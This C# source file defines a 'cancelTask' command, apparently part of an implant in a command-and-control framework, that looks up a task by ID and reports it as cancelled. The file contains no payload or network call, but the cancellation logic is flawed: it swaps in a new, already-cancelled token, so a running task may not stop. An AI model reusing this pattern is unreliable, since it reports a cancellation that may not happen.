using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class CancelTask : EngineerCommand
    {
        public override string Name => "cancelTask";

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/TaskId", out string canceltaskId);
            //find the task and cancel its CancellationToken
            var taskToCancel = Tasking.engTaskDic[canceltaskId];
            CancellationTokenSource cts = new CancellationTokenSource();
            taskToCancel.cancelToken = cts.Token;
            cts.Cancel();
            //call FillTaskResult saying we cancelled the task
            Tasking.FillTaskResults($"Cancelled task {canceltaskId}", task, EngTaskStatus.Complete);
        }
    }
}
